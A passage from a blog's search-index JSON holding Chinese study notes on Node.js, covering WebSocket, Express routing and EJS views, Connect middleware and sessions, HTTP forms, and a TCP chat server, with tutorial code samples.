3000&#125;);//静态托管app.use(express.static('public'));/** * 监听连接 */wss.on('connection', function (ws) &#123; ws.on('message', function (msg) &#123; console.log(' \\033[96mgot:\\033[39m ' + msg); ws.send('pong'); &#125;);&#125;);/** * 监听端口 */app.listen(8080); 客户端1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;WebSocket echo test&lt;/title&gt; &lt;script&gt; var lastMessage;//储存延时的变量 window.onload = function () &#123; //创建socket var ws = new WebSocket('ws://localhost:3000'); //建立第一次连接时触发 ws.onopen = function () &#123; //发送第一条pong ping(); &#125;; //返回数据时触发 //计算延时，并且再发出一条信息 ws.onmessage = function (ev) &#123; console.log(' got: ' + ev.data); //获得返回数据，测量延迟 document.getElementById('latency').innerHTML = new Date - lastMessage; //ping again ping(); &#125; function ping() &#123; //记录时间戳 lastMessage = +new Date; //发送消息 ws.send('ping'); &#125; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;WebSocket Echo&lt;/h1&gt; &lt;h2&gt;Latency: &lt;span id=\"latency\"&gt;&lt;/span&gt;ms&lt;/h2&gt;&lt;/body&gt;&lt;/html&gt; 自制-共享端口123456789101112131415161718192021222324252627282930313233343536373839var express = require('express');var http = require('http');/** * 启动服务 */var app = express();var WebSocketServer = require('ws').Server;var wss = new WebSocketServer(&#123; noServer: true&#125;);//静态托管app.use(express.static('public'));/** * 监听连接 */wss.on('connection', function (ws) &#123; ws.on('message', function (msg) &#123; console.log(' \\033[96m got:\\033[39m ' + msg); ws.send('pong'); &#125;);&#125;);var server = http.createServer(app);//socket是http的更高一层，所以使用upgrade事件server.on('upgrade', function upgrade(req, socket, head) &#123; console.log(\"received\"); wss.handleUpgrade(req, socket, head, function done (ws) &#123; wss.emit('connection', ws, req); &#125;)&#125;)/** * 监听端口 */server.listen(3000);","tags":[{"name":"node","slug":"node","permalink":"https://v25bh145.github.io/tags/node/"},{"name":"《了不起的Node JS 将JavaScript进行到底》","slug":"《了不起的Node-JS-将JavaScript进行到底》","permalink":"https://v25bh145.github.io/tags/%E3%80%8A%E4%BA%86%E4%B8%8D%E8%B5%B7%E7%9A%84Node-JS-%E5%B0%86JavaScript%E8%BF%9B%E8%A1%8C%E5%88%B0%E5%BA%95%E3%80%8B/"}]},{"title":"9.Express","date":"2020-09-29T11:14:24.000Z","path":"2020/09/29/nodeJs/9. express/","text":"Express一个小型express应用创建模块123456789&#123; \"name\": \"express-tweet\", \"version\": \"0.0.1\", \"dependencies\": &#123; \"express\": \"*\", \"ejs\": \"*\", \"superagent\": \"*\" &#125;&#125; ejs./view/index.ejs 1234567&lt;h1&gt;Twitter app&lt;/h1&gt;&lt;p&gt;Please enter your search term:&lt;/p&gt;&lt;form action=&quot;/search&quot; method = &quot;GET&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;q&quot; /&gt; &lt;button&gt;SEARCH&lt;/button&gt;&lt;/form&gt; ./view/search.ejs 1234567891011&lt;h1&gt;Tweet results for &lt;%= search %&gt;&lt;/h1&gt;&lt;!--我们将JavaScript代码嵌在标签中，通过在标签之后加入=来将变量值打印出来--&gt;&lt;% if (results.length) &#123; %&gt; &lt;ul&gt; &lt;% for (var i = 0; i &lt; results.length; i++) &#123; %&gt; &lt;li&gt;&lt;%= results[i].text %&gt; - &lt;em&gt;&lt;%= results[i].from_user %&gt;&lt;/em&gt;&lt;/li&gt; &lt;% &#125; %&gt; &lt;/ul&gt;&lt;% &#125; else &#123; %&gt; &lt;p&gt;No results&lt;/p&gt;&lt;% &#125; %&gt; jsserver.js 12345678910111213141516171819202122232425262728293031323334/** * 模块依赖 */var express = require(&apos;express&apos;);//创建服务 - 自己修改过，书上是老版本的用法var app = express();//指定模板引擎app.set(&apos;view engine&apos;, &apos;ejs&apos;);//指定视图文件所在的路径app.set(&apos;views&apos;, __dirname + &apos;/views&apos;);//视图文件选项app.set(&apos;view options&apos;, &#123;layout: false&#125;);/** * 路由 */app.get(&apos;/&apos;, function(req, res) &#123; /* Express为response对象提供了render方法，该方法完成了下面的三件事: 1. 初始化模板引擎 2. 读取视图文件并将其传递给模板引擎 3. 获取解析后的HTML页面并作为响应发送给客户端 */ res.render(&apos;index&apos;);&#125;)/** * 监听 */app.listen(3000); 路由example 123456789101112131415161718192021222324//路由示例app.get('/', function (req, res, next)&#123; //sth&#125;)//:name 匹配参数，id值不同也能匹配到app.put('/post/:name', function (req, res, next)&#123; //sth&#125;)app.post('/signup', function (req, res, next)&#123; //sth&#125;)app.del('/user/:id', function (req, res, next)&#123; //sth&#125;)app.patch('/user/:id', function (req, res, next)&#123; //sth&#125;)app.head('/user/:id', function (req, res, next)&#123; //sth&#125;) 查询路由 123456789101112var search = require('./search');/*...*/app.get('/search', function (req, res, next) &#123; search(req.query.q, function (err, tweets) &#123; //如果报错就把错传递下去 if (err) return next(err); //render给ejs传参(json)，这里的变量成为本地变量，因为其内容只对其传递的视图可见 res.render('search', &#123; results: tweets, search: req.query.q &#125;); &#125;)&#125;) 最终的server123456789101112131415161718192021222324252627282930313233343536373839404142/** * 模块依赖 */var express = require('express');var search = require('./search');//创建服务var app = express();//指定模板引擎app.set('view engine', 'ejs');//指定视图文件所在的路径app.set('views', __dirname + '/views');//视图文件选项app.set('view options', &#123; layout: false &#125;);/** * 路由 */app.get('/', function (req, res) &#123; /* Express为response对象提供了render方法，该方法完成了下面的三件事: 1. 初始化模板引擎 2. 读取视图文件并将其传递给模板引擎 3. 获取解析后的HTML页面并作为响应发送给客户端 */ res.render('index');&#125;)app.get('/search', function (req, res, next) &#123; search(req.query.q, function (err, tweets) &#123; //如果报错就把错传递下去 if (err) return next(err); //render给ejs传参(json)，这里的变量成为本地变量，因为其内容只对其传递的视图可见 res.render('search', &#123; results: tweets, search: req.query.q &#125;); &#125;)&#125;)/** * 监听 */app.listen(3000); 查询search.js 12345678910111213141516171819202122/** * Search function. * * @param (String) search query * @param (Function) callback * @api public */var request = require('superagent');module.exports = function search(query, fn) &#123; request.get('http://search.twitter.com/search.json') .send(&#123; q: query &#125;) .end(function (res) &#123; if (res.body &amp;&amp; Array.isArray(res.body.results)) &#123; //如果superagent获取到了json格式的信息，他会自动解码放到body中 return fn(null, res.body.results); &#125; else &#123; fn(new Error('Bad twitter response')); &#125; &#125;)&#125; 一些express设置 缓存模板引擎 1app.enable('view cache', true); 模板引擎 Haml Jade ejs CoffeeKup jQuery Templates for node 错误处理 将错误参数通过next传递下去，通常express会展示一个错误页面并且发送500状态码 自定义错误处理 12345678910// error handlerapp.use(function(err, req, res, next) &#123; // set locals, only providing error in development res.locals.message = err.message; res.locals.error = req.app.get('env') === 'development' ? err : &#123;&#125;; // render the error page res.status(err.status || 500); res.render('error'); &#125;); 方便的函数request 1req.header(sth); //返回头部的信息 e.g: 1console.log(req.header('HoSt')); //不区分大小写 1req.accepts('text/html'); //分析请求中的Accept头信息，根据值返回true / false 1req.is('text/html'); //与accepts类似，但是它会检查Content-Type头信息 response 1res.render(filename); //渲染文件，路径在views设置中( app.set('views', __dirname + '/views'); ) 12345//经测试，响应会在send之后结束res.send(Number); //发送状态码res.send(Object); //发送对象(被解析为JSON字符串)res.send(Array); //发送数组(被解析为字符串)res.send(String); //发送字符串 1res.redirect(path(, Number)); //等效于发送302状态码以及Location头信息，第二个参数允许自己设置状态码 路由 路由传参，变量被注入到req.params中 123app.get('/example/:name', function (req, res, next) &#123; res.send(req.params.name);//字符串类型&#125;); 还可以加问号表示可选 123app.get('/example/:name?', function (req, res, next) &#123; res.send(req.params.name);//字符串类型&#125;); 还可以使用RegExp对象(正则表达式)进行匹配 123app.get( /^\\/post\\/([a-z\\d\\-]*)/ , function (req, res, next) &#123; res.send('success');&#125;); 在路由中使用next，可以跳过这个路由，让其他路由进行处理 123456app.get('/search/:name', function (req, res, next) &#123; if(req.params.name == \"f**k\") return next();&#125;);app.get('/search/f**k', function (req, res, next) &#123; //do sth if the route is /search/f**k&#125;); 同时也可以next(err)来传递错误 在中间件中使用next(&#39;route&#39;)，可以确保当前路由被跳过 中间件 1app.use(func); 1234567891011//在特定的路由中使用中间件function secure (req, res, next) &#123; //do sth&#125;app.get('/financials', secure, function (req, res, next) &#123; //do sth&#125;);//也可以定义多个中间件app.get('/route', a, b, c, function(req, res, next) &#123; //do sth&#125;); 代码组织策略 模块化 -第一准则 维护一个server.js文件，该文件包含了路由表，同时将每一部分路由处理器都通过模块化的方式引入 app挂载 将整个express的app作为一个模块，并且挂载到现有应用中 var app = module.exports = express() e.g: //blog.js中 var app = module.exports = require('express')(); /** * 路由 */ app.get('/', function (req, res, next) { //do sth }) app.get('/categories', function (req, res, next) { //do sth }) app.get('/search', function (req, res, next) { //do sth }) &lt;!--￼23--&gt;","tags":[{"name":"node","slug":"node","permalink":"https://v25bh145.github.io/tags/node/"},{"name":"《了不起的Node JS 将JavaScript进行到底》","slug":"《了不起的Node-JS-将JavaScript进行到底》","permalink":"https://v25bh145.github.io/tags/%E3%80%8A%E4%BA%86%E4%B8%8D%E8%B5%B7%E7%9A%84Node-JS-%E5%B0%86JavaScript%E8%BF%9B%E8%A1%8C%E5%88%B0%E5%BA%95%E3%80%8B/"}]},{"title":"8.connect","date":"2020-09-29T11:13:24.000Z","path":"2020/09/29/nodeJs/8. connect 中间件/","text":"connect 基于HTTP服务器的工具集，提供了一种新的组织代码的方式来与请求，响应对象进行交互，称中间件(middleware) 比较-原生http与connect 原生http 1234567891011121314151617181920212223242526var http = require('http'), fs = require('fs');var server = http.createServer(function (req, res) &#123; if ('GET' == req.method &amp;&amp; '/images' == req.url.substr(0, 7) &amp;&amp; '.jpg' == req.url.substr(-4)) &#123; fs.stat(__dirname + req.url, function (err, stat) &#123; if (err || !stat.isFile()) &#123; res.writeHead(404); res.end('Not Found'); return; &#125; serve(__dirname + req.url, 'application/jpg', res); &#125;); &#125; else if ('GET' == req.method &amp;&amp; '/' == req.url) &#123; serve(__dirname + '/index.html', 'text/html', res); &#125; else &#123; res.writeHead(404); res.end('Not Found'); &#125;&#125;)function serve(path, type, res) &#123; res.writeHead(200, &#123; 'Content-Type': type &#125;); //HTTP响应对象是只写的，从文件创建出来的流是只读的 fs.createReadStream(path).pipe(res);&#125;server.listen(3000); connect package.json 1234567&#123; \"name\": \"my-website\", \"version\": \"0.0.1\", \"dependencies\": &#123; \"connect\": \"*\" &#125;&#125; 代码 1234567891011121314151617181920212223/** * 模块依赖 *///书上的是旧版的connect( &lt; 3.0.0)的使用方法，自己摸索出了新版的使用方法var connect = require('connect');var serveStatic = require('serve-static')/** * 创建服务器 */var server = connect();/** * 处理静态文件 *///通过use方法添加static中间件//e.g:使用127.0.0.1:3000/images/example4.jpg访问./website/images/example4.jpgserver.use(serveStatic(__dirname + '/website'));/** * 监听 */server.listen(3000);//Connect还可以自己处理404的情况 设计一个更大型的应用需求 记录请求处理时间 托管静态文件 处理授权 代码1234567891011121314151617181920212223242526272829303132333435var server = require('connect')();//在中间件同时处理路由，返回数据，兼当控制器的作用//一些地方没有具体实现server.use(function (req, res, next) &#123; //记录日志 console.error(' %s %s ', req.method, req.url); next();&#125;);server.use(function (req, res, next) &#123; if('GET' == req.method &amp;&amp; '/images' == req.url.substr(0, 7)) &#123; //托管图片 &#125; else &#123; //交给其他中间件处理 next(); &#125;&#125;);server.use(function (req, res, next) &#123; if('GET' == req.method &amp;&amp; '/' == req.url) &#123; //响应index.html文件 &#125; else &#123; //交给其他中间件处理 next(); &#125;&#125;);server.use(function (req, res, next) &#123; //最后一个中间件，如果到了这里，就意味着无能为力，返回404 res.writeHead(404); res.end('Not Found');&#125;);server.listen(3000); 中间件-编写可重用的中间件 一个用于当请求时间过长而进行警告的中间件 request-time.js 暴露一个函数，暴露的函数本身返回一个函数 - 一个对于可配置的中间件来说很常见的写法 框架 12345678910111213141516/** * 请求时间中间件 * * 选项： * -'time'('Number')：超时阈值(默认100ms) * * @param &#123;Object&#125; options * @api public */module.exports = function (opts) &#123; // ... return function(req, res, next) &#123; //... next(); &#125;&#125; 实现12345678910111213141516171819202122232425262728/** * 请求时间中间件 * * 选项： * -'time'('Number')：超时阈值(默认100ms) * * @param &#123;Object&#125; options * @api public */module.exports = function (opts) &#123; var time = opts.time || 100; return function (req, res, next) &#123; var timer = setTimeout(function () &#123; console.log('\\033[90m%s %s\\033[39m \\033[91mis taking too long!\\033[39m', req.method, req.url); &#125;, time); //这个技巧称为 重写方法/猴子补丁(monkey-patch) //将原本的方法置换为包含原本方法的函数，在其他的地方调用这个被置换过的方法时，被置换的方法方法可以在执行原来方法的同时执行一些别的方法 var end = res.end; res.end = function (chunk, encoding) &#123; res.end = end; res.end(chunk, encoding); clearTimeout(timer); &#125;; next(); &#125;;&#125;; 测试123456789101112131415161718192021222324252627282930313233343536373839var connect = require('connect');var time = require('./request-time');var morgan = require('morgan');var fs = require('fs');var app = connect();// create a write stream (in append mode)var accessLogStream = fs.createWriteStream(__dirname + 'access.log', &#123; flags: 'a' &#125;); // setup the loggerapp.use(morgan('combined', &#123; stream: accessLogStream &#125;));app.use(time(&#123;time: 500&#125;));/** * 快速响应 */app.use(function(req, res, next) &#123; if('/a' == req.url) &#123; res.writeHead(200); res.end('Fast!'); &#125; else &#123; next(); &#125;&#125;);app.use(function (req, res, next) &#123; if('/b' == req.url) &#123; setTimeout(function () &#123; res.writeHead(200); res.end('Slow!'); &#125;, 1000); &#125; else &#123; next(); &#125;&#125;);app.listen(3000); 中间件-举例static(现在改名为serve-static) static允许将任意一个url匹配到文件系统中任意一个目录 1server.use(serveStatic(__dirname + 'website')); // app.use() 这种起名方式貌似比较好 自己测试发现，托管是动态托管，非常nb 参数 maxAge 一个资源在客户端缓存的时间(ms)，在此期间内文件内容将被缓存起来，改动则不会被再缓存 query中间件 现在已经被qs(querystring)替代，默认在express中启用 logger中间件 将发送进来的请求和发送出去的响应信息打印在终端(可配置打印在日志文件中) 1server.use(logger('dev')); body parser中间件 书上的方法已经过时，这里是自己探索出的使用方法 123456789101112131415161718192021222324252627//部分代码,已经测试过可行var bodyParser = require('body-parser');var jsonParser = bodyParser.json();var urlencodedParser = bodyParser.urlencoded(&#123; extended: false &#125;);//可以x-www-form-urlencoded，也就是表单数据var app = connect();app.use(urlencodedParser);app.use(function (req, res, next) &#123; if (req.url == '/x-www-form-urlencoded' &amp;&amp; req.method == 'POST') &#123; console.log(req.body); res.writeHead(200); res.end('success'); &#125; else &#123; next(); &#125;&#125;);app.use(jsonParser);app.use(function (req, res, next) &#123; if (req.url == '/raw-json' &amp;&amp; req.method == 'POST') &#123; console.log(req.body); res.writeHead(200); res.end('success'); &#125; else &#123; next(); &#125;&#125;); 会话(session)json文件 123456&#123; \"tobi\": &#123; \"password\":\"ferret\", \"name\": \"Tobi Holowaychuk\" &#125;&#125; 代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687var connect = require('connect'), users = require('./users.json'), logger = require('morgan'), bodyParser = require('body-parser'), cookieParser = require('cookie-parser'), session = require('express-session');//这里直接Require了json文件，当你对外暴露数据时，不需要加上module.exports，直接把数据以json形式暴露出来就可以了(技巧-暴露数据可以用json文件)var urlencodedParser = bodyParser.urlencoded(&#123; extended: false &#125;);var app = connect();app.use(urlencodedParser);app.use(logger('dev'));app.use(cookieParser());app.use(session(&#123; secret: \"my app secret\", resave: true, saveUninitialized: true//这里一定要加上去，否则会存不住session&#125;));app.use(function (req, res, next) &#123; if ('/' == req.url &amp;&amp; req.session.logged_in) &#123; res.writeHead(200, &#123; 'Content-Type': 'text/html' &#125;); res.end('Welcome back, &lt;b&gt;' + req.session.name + '&lt;b&gt;' + '&lt;a href = \"/logout\"&gt;Logout&lt;/a&gt;'); &#125; else &#123; next(); &#125;&#125;);app.use(function (req, res, next) &#123; if ('/' == req.url &amp;&amp; 'GET' == req.method) &#123; res.writeHead(200, &#123; 'Content-Type': 'text/html' &#125;); res.end([ '&lt;form action = \"/login\" method = \"post\"&gt;', '&lt;fieldset&gt;', '&lt;legend&gt;please log in&lt;/legend&gt;', '&lt;p&gt;user: &lt;input type=\"text\" name=\"user\"&gt;&lt;/p&gt;', '&lt;p&gt;password: &lt;input type=\"password\" name=\"password\"&gt;&lt;/p&gt;', '&lt;button&gt;Submit&lt;/button&gt;', '&lt;fieldset&gt;', '&lt;/form&gt;' ].join('')); &#125; else &#123; next(); &#125;&#125;);app.use(function (req, res, next) &#123; if ('/login' == req.url &amp;&amp; 'POST' == req.method) &#123; res.writeHead(200); console.log(req.body); console.log(users); if (!users[req.body.user] || req.body.password != users[req.body.user].password) &#123; res.end('Bad username/password'); &#125; else &#123; //注意是req //该对象的session在响应发送出去时会自动保存，无需手动处理 req.session.logged_in = true; req.session.name = users[req.body.user].name; res.end('Authenticated!'); console.log(req.session.name); &#125; &#125; else &#123; next(); &#125;&#125;);app.use(function (req, res, next) &#123; if ('/logout' == req.url &amp;&amp; req.method == 'GET') &#123; console.log(req.session.name); if (req.session.logged_in) &#123; req.session.logged_in == false; res.writeHead(200); res.end('logged out!'); &#125; else &#123; res.writeHead(200); res.end('Have not logged!'); &#125; &#125; else &#123; next(); &#125;&#125;);app.listen(3000); Redis session 将session存入数据库，将session脱离进程 12345678910var redis = require('redis');//持久化存储var RedisStore = require('connect-redis')(session);//持久化存储var redisClient = redis.createClient();//持久化存储app.use(session(&#123; store: new RedisStore(&#123;client: redisClient&#125;),//持久化存储 secret: \"my app secret\", resave: false, saveUninitialized: true//这里一定要加上去，否则会存不住session&#125;)); basicAuth中间件 对客户端进行基本的身份验证 e.g:一个简单的身份验证系统 12","tags":[{"name":"node","slug":"node","permalink":"https://v25bh145.github.io/tags/node/"},{"name":"《了不起的Node JS 将JavaScript进行到底》","slug":"《了不起的Node-JS-将JavaScript进行到底》","permalink":"https://v25bh145.github.io/tags/%E3%80%8A%E4%BA%86%E4%B8%8D%E8%B5%B7%E7%9A%84Node-JS-%E5%B0%86JavaScript%E8%BF%9B%E8%A1%8C%E5%88%B0%E5%BA%95%E3%80%8B/"}]},{"title":"7.HTTP --TCP上层的超文本传输协议","date":"2020-09-29T11:12:24.000Z","path":"2020/09/29/nodeJs/7. HTTP/","text":"HTTP –TCP上层的超文本传输协议HTTP结构 12345require('http').createServer(function (req, res) &#123; res.writeHead(200); res.end('Hello World');&#125;).listen(3000); 1234567HTTP / 1.1 200 OKDate: Mon, 31 Aug 2020 22: 57: 14 GMTConnection: keep - aliveTransfer - Encoding: chunkedbHello World0 头信息 “Content-Type” 文本类型：text/plain 普通文本 text/html 富文本 “Transfer-Encoding” 头信息默认值 chunked(使得响应逐步产生) “Connection” 连接状态 keep-alive 保持连接，不用重复连接TCP 流 管道 的应用(两者等效) require('fs').createReadStream('image.png').pipe(res); &lt;!--￼2--&gt; 连接 TCP连接：connection对象 http连接：req, res对象 在http连接中获取tcp连接：req.connection(不常用) 处理用户提交的表单 创建模块 12345&#123; \"name\": \"http-form\", \"description\": \"An HTTP server that processes forms\", \"version\": \"0.0.1\"&#125; 表单 123456789101112131415161718require('http').createServer(function (req, res) &#123; if('/' == req.url) &#123; res.writeHead(200, &#123;\"Content-Type\": \"text/html\"&#125;); res.end([ '&lt;form method=\"POST\" action=\"url\" ', '&lt;h1&gt;My form&lt;/h1&gt;', '&lt;fieldset&gt;', '&lt;label&gt;Personal information&lt;/label&gt;', '&lt;p&gt;What is your name?&lt;/p&gt;', '&lt;input type=\"text\" name=\"name\"', '&lt;p&gt;&lt;button&gt;Submit&lt;/button&gt;&lt;/p&gt;', '&lt;/form&gt;' ].join('')); &#125; else if ('/url' == req.url) &#123; res.writeHead(200, &#123;'Content-Type': \"text/html\"&#125;); res.end('You sent a &lt;em?&gt;' + req.method + '&lt;/em? request'); &#125;&#125;).listen(3000); method 123456789101112131415161718192021222324require('http').createServer(function (req, res) &#123; if ('/' == req.url) &#123; res.writeHead(200, &#123; \"Content-Type\": \"text/html\" &#125;); res.end([ '&lt;form method=\"POST\" action=\"url\" ', '&lt;h1&gt;My form&lt;/h1&gt;', '&lt;fieldset&gt;', '&lt;label&gt;Personal information&lt;/label&gt;', '&lt;p&gt;What is your name?&lt;/p&gt;', '&lt;input type=\"text\" name=\"name\"', '&lt;p&gt;&lt;button&gt;Submit&lt;/button&gt;&lt;/p&gt;', '&lt;/form&gt;' ].join('')); &#125; else if ('/url' == req.url &amp;&amp; 'POST' == req.method) &#123; var body = ''; req.on('data', function (chunk) &#123; body += chunk; &#125;); req.on('end', function () &#123; res.writeHead(200, &#123; 'Content-Type': \"text/html\" &#125;); res.end('&lt;p&gt;Content-Type: ' + req.headers['content-type'] + '&lt;/p&gt;' + '&lt;p&gt;Data: &lt;/p&gt;&lt;pre&gt;' + body + '&lt;/pre&gt;'); &#125;); &#125;&#125;).listen(3000); url querystring对url进行处理 12console.log(require('querystring').parse('name=Guillermo'));console.log(require('querystring').parse('q=guillermo+rauch')); 12[Object: null prototype] &#123; name: &apos;Guillermo&apos; &#125;[Object: null prototype] &#123; q: &apos;guillermo rauch&apos; &#125; 整合12345678910111213141516171819202122232425262728293031var qs = require('querystring');require('http').createServer(function (req, res) &#123; if ('/' == req.url) &#123; res.writeHead(200, &#123; \"Content-Type\": \"text/html\" &#125;); res.end([ '&lt;form method=\"POST\" action=\"url\" ', '&lt;h1&gt;My form&lt;/h1&gt;', '&lt;fieldset&gt;', '&lt;label&gt;Personal information&lt;/label&gt;', '&lt;p&gt;What is your name?&lt;/p&gt;', '&lt;input type=\"text\" name=\"name\"', '&lt;p&gt;&lt;button&gt;Submit&lt;/button&gt;&lt;/p&gt;', '&lt;/form&gt;' ].join('')); &#125; else if ('/url' == req.url &amp;&amp; 'POST' == req.method) &#123; var body = ''; req.on('data', function (chunk) &#123; body += chunk; &#125;); req.on('end', function () &#123; res.writeHead(200, &#123; 'Content-Type': \"text/html\" &#125;); //使用querystring处理 res.end('&lt;p&gt;Your name is &lt;b&gt;' + qs.parse(body).name + '&lt;/b&gt;&lt;/p&gt;'); &#125;); &#125; else &#123; //404处理 res.writeHead(404); res.end('Not Found'); &#125;&#125;).listen(3000); 一个Twitter Web客户端 创建模块 123456&#123; \"name\": \"tweet-client\", \"description\": \"An HTTP tweets client\", \"version\": \"0.0.1\"&#125; 发送一个简单的http请求123456789101112131415require('http').request(&#123;//初始化一个新的http.Client Request对象 host: '127.0.0.1', port: 3000, url: '/', method: 'GET'&#125;, function (res) &#123; var body = \"\"; res.setEncoding('utf8'); res.on('data', function (chunk) &#123; body += chunk; &#125;); res.on('end', function() &#123; console.log('\\r\\n We got: \\033[96m' + body + '\\033[39m\\r\\n'); &#125;)&#125;).end();//调用end(): 原因是创建完一个请求之后，在发送给服务器前还可以和request对象进行交互 1We got: &lt;form method=&quot;POST&quot; action=&quot;url&quot; &lt;h1&gt;My form&lt;/h1&gt;&lt;fieldset&gt;&lt;label&gt;Personal information&lt;/label&gt;&lt;p&gt;What is your name?&lt;/p&gt;&lt;input type=&quot;text&quot; name=&quot;name&quot;&lt;p&gt;&lt;button&gt;Submit&lt;/button&gt;&lt;/p&gt;&lt;/form&gt; 模拟一次请求 服务端 1234567891011121314var qs = require('querystring');require('http').createServer(function (req, res) &#123; var body = ''; req.on('data', function (chunk) &#123; body += chunk; &#125;); req.on('end', function () &#123; res.writeHead(200); res.end('done'); console.log('\\r\\n got name \\033[90m' + qs.parse(body).name + '\\033[39m\\r\\n'); &#125;);&#125;).listen(3000); 客户端 12345678910111213141516171819202122232425262728var http = require('http');var qs = require('querystring');function send(theName) &#123; http.request(&#123; host: '127.0.0.1', port: 3000, url: '/', method: 'POST' &#125;, function (res) &#123; res.setEncoding('utf8'); //自己注册的事件，end事件在测试中发现需要先注册data事件 res.on('data', function (data) &#123; console.log(\"Data: \" + data); &#125;) res.on('end', function () &#123; console.log('\\r\\n \\033[90m request complete!\\033[39m'); process.stdout.write('\\r\\n your name: '); &#125;); &#125;).end(qs.stringify(&#123;name: theName&#125;));&#125;process.stdout.write('\\r\\n your name: ');process.stdin.resume();process.stdin.setEncoding('utf-8');process.stdin.on('data', function (name) &#123; send(name.replace('\\n', ''));&#125;) 获取推文123456789101112131415161718192021222324252627var qs = require('querystring');var http = require('http');var search = process.argv.slice(2).join(' ').trim();if (!search.length) &#123; return console.log('\\r\\n Usage: node tweets &lt;search term&gt;\\r\\n');&#125;console.log('\\r\\n searching for: \\033[96m' + search + '\\033[39m\\r\\n');http.request(&#123; //also http.get(obj, func);(这种方法不用.end()) host: 'search.twitter.com', path: '/search.json?' + qs.stringify(&#123; q: search &#125;)&#125;, function (res) &#123; var body = ''; res.setEncoding('utf8'); res.on('data', function (chunk) &#123; body += chunk; &#125;); res.on('end', function () &#123; var obj = JSON.parse(body); obj.results.forEach(function (tweet) &#123; console.log(' \\033[90m' + tweet.text + '\\033[39m'); console.log(' \\033[94m' + TreeWalker.from_user + '\\033[39m'); console.log('--'); &#125;); &#125;);&#125;).end(); superagent(客户端) 1npm install superagent 1234var request = require('superagent');request.get('http://twitter.com/search.json') .send(&#123; q: 'justin bieber' &#125;) .end(function (res) &#123; console.log(res.body) &#125;);","tags":[{"name":"node","slug":"node","permalink":"https://v25bh145.github.io/tags/node/"},{"name":"《了不起的Node JS 将JavaScript进行到底》","slug":"《了不起的Node-JS-将JavaScript进行到底》","permalink":"https://v25bh145.github.io/tags/%E3%80%8A%E4%BA%86%E4%B8%8D%E8%B5%B7%E7%9A%84Node-JS-%E5%B0%86JavaScript%E8%BF%9B%E8%A1%8C%E5%88%B0%E5%BA%95%E3%80%8B/"}]},{"title":"6.TCP服务器","date":"2020-09-29T11:11:24.000Z","path":"2020/09/29/nodeJs/6. TCP服务器 在线聊天应用/","text":"TCP服务器 创建TCP服务器 使用telnet测试创建1234require('http').createServer(function (req, res) &#123; res.writeHead(200, &#123;'Content-Type': 'text/html'&#125;); res.end('&lt;h1&gt;hello world&lt;/h1&gt;');&#125;).listen(3000); 测试1234567891011121314telnet 127.0.0.1 3000(ctrl + ] 接回车)GET / HTTP / 1.1HTTP / 1.1 200 OKContent - Type: text / htmlDate: Mon, 31 Aug 2020 01: 42: 05 GMTConnection: keep - aliveTransfer - Encoding: chunked14&lt;h1&gt; hello world&lt;/h1&gt;0 一个聊天应用需求 成功连接到服务器后，服务器会显示欢迎信息，并要求输入用户名，同时还会告诉你当前还有多少其他客户端也连接到了服务器 输入用户名，按下回车后，即认为已经连接上了服务器 连接之后，输入信息按下回车，向其他客户端进行消息的收发 按下回车相当于输入了 \\n 字符，在node服务器端，通过\\n来判断消息是否已完全到达 创建模块12345&#123; \"name\": \"tcp-chat\", \"description\": \"Our first TCP server\", \"version\": \"0.0.1\"&#125; 创建服务器12345678910111213141516171819/** * 模块依赖 */ var net = require('net'); /** * 创建服务器 */ var server = net.createServer(function (conn) &#123; //handle connection console.log('\\033[90m new connection!\\033[39m'); &#125;) /** * 监听 */ server.listen(3000, function()&#123; console.log('\\033[96m server listening on *:3000\\033[39m'); &#125;) 接收连接1234567891011121314151617181920212223var count = 0;/** * 创建服务器 */var server = net.createServer(function (conn) &#123; conn.write( '\\n &gt; welcome to \\033[92m node-chat\\033[39m!' + '\\n &gt; ' + count + ' other people are connected at this time.' + '\\n &gt; please write your name and press enter: ' ); count++; conn.setEncoding('utf8'); conn.on('data', function (data) &#123; //如果没有设置编码，接收到的数据将会是一个Buffer console.log(data); &#125;) //底层套接字关闭时，Node.js会触发close事件(end事件：当客户端显示关闭TCP连接时触发，当发生error事件时end事件不会触发，不过发生error / end事件时close事件都会触发) conn.on('close', function () &#123; count--; &#125;);&#125;); 创建用户数组，添加通知1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859/** * 模块依赖 */var net = require('net');//count计数器称为状态，在本例中，两个不同连接的用户需要修改同一个状态变量，这时称为共享状态的并发var count = 0, users = &#123;&#125;;/** * 创建服务器 */var server = net.createServer(function (conn) &#123; conn.write( '\\n &gt; welcome to \\033[92m node-chat\\033[39m!' + '\\n &gt; ' + count + ' other people are connected at this time.' + '\\n &gt; please write your name and press enter: ' ); count++; conn.setEncoding('utf8'); //昵称 var nickname; conn.on('data', function (data) &#123; if(!nickname) &#123; //第一份输入的数据是nickname if(users[data]) &#123; conn.write('\\033[930&gt; nickname already in use. try again:\\033[39m '); return; &#125; else &#123; nickname = data; users[nickname] = conn; for(var i in users) &#123; users[i].write('\\033[90m &gt; ' + nickname + ' joined the room\\033[39m\\n'); &#125; &#125; &#125; else &#123; for(var i in users) &#123; if(i != nickname) &#123; //消息通知其他人 users[i].write('\\033[96m &gt; ' + nickname + ':\\033[39m ' + data + '\\n'); &#125; &#125; &#125; &#125;) conn.on('close', function () &#123; count--; &#125;);&#125;);/** * 监听 */server.listen(3000, function () &#123; console.log('\\033[96m server listening on *:3000\\033[39m');&#125;) 完成1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465/** * 模块依赖 */var net = require('net');var count = 0, users = &#123;&#125;;/** * 创建服务器 */var server = net.createServer(function (conn) &#123; conn.write( '\\r\\n &gt; welcome to \\033[92m node-chat\\033[39m!' + '\\r\\n &gt; ' + count + ' other people are connected at this time.' + '\\r\\n &gt; please write your name and press enter: ' ); count++; conn.setEncoding('utf8'); var nickname; //发现data事件在自己这里是一个字符一个字符输出的，所以就做了个存储 var data = \"\"; conn.on('data', function (chunk) &#123; if (chunk === \"\\r\\n\") &#123; if (!nickname) &#123; if (users[data]) &#123; conn.write('\\033[930&gt; nickname already in use. try again:\\033[39m '); return; &#125; else &#123; nickname = data; users[nickname] = conn; broadcast('\\033[90m &gt; ' + nickname + 